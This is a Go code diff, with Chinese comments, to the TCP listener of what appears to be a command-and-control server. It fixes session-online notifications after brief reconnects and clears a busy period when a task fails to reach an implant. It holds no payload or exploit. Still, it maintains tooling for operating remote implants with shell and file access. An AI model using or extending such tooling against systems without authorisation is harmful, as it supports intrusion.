@@ -837,12 +837,20 @@ func (l *TCPListener) handleRegister(conn net.Conn, packet *protocol.Packet) {
 		// 表现为 HTTPS 站点 ERR_SSL_PROTOCOL_ERROR / 连接挂起。
 		existing, gerr := l.sessionMgr.Get(sessionID)
 		if gerr == nil && existing != nil {
-			wasDead := existing.Info == nil || existing.Info.Status == "dead" || existing.Info.Status == "asleep"
 			sess.RemoteAddr = conn.RemoteAddr().String()
 			sess.LastSeen = time.Now()
 			_ = l.sessionMgr.RefreshInfo(sessionID, sess)
-			// 死亡会话重连复活：同样广播上线事件，让前端即时点亮（不依赖轮询）
-			if wasDead && l.onSessionOnline != nil {
+			// 这里必须**无条件**走一次上线通知，不能只在 wasDead 时才调：
+			// BroadcastSessionOnline 内部已按"是否已在线"去重（重复注册不会重复广播、
+			// 也不会重复触发 webhook），但它**同时负责取消待发的 session_offline**，
+			// 也就是离线观察窗内的闪断抑制。加 wasDead 守卫会把"内存里仍是 active 的
+			// 闪断重连"挡在门外，观察窗到期后照样广播离线。实测日志：
+			//   16:02:17 Connection cleared / 判定离线，15s 后广播
+			//   16:02:22 Connection set          ← 5 秒后已经重连回来了
+			//   16:02:32 持续失联，广播 session_offline   ← 重连没能取消掉
+			// 前端收到 session_offline 会把整个会话详情面板关掉（setSelectedSession(null)），
+			// 用户正开着的 Shell/文件面板会凭空消失。
+			if l.onSessionOnline != nil {
 				l.onSessionOnline(sess)
 			}
 		} else {
@@ -1047,6 +1055,11 @@ func (l *TCPListener) PushTask(sessionID string, taskInfo *types.TaskInfo) error
 	}
 	if err := l.queuePacket(sessionID, packet, true); err != nil {
 		l.sessionMgr.ClearConnection(sessionID)
+		// 下发失败 == 任务根本没到植入端，必须一并清掉 Create() 时设下的忙期。
+		// 否则操作员每点一次命令，就给一个已失联的会话续一次 2×心跳超时 的忙期，
+		// 判活窗口被放宽 BusyGrace 倍 —— 界面一直显示"在线"，
+		// 而实际每条命令都是 no writer。实测正是这条路径把 6 分钟的假在线拖了出来。
+		l.sessionMgr.ClearSessionBusy(sessionID)
 		return fmt.Errorf("failed to send task: %w", err)
 	}
 	now := time.Now()
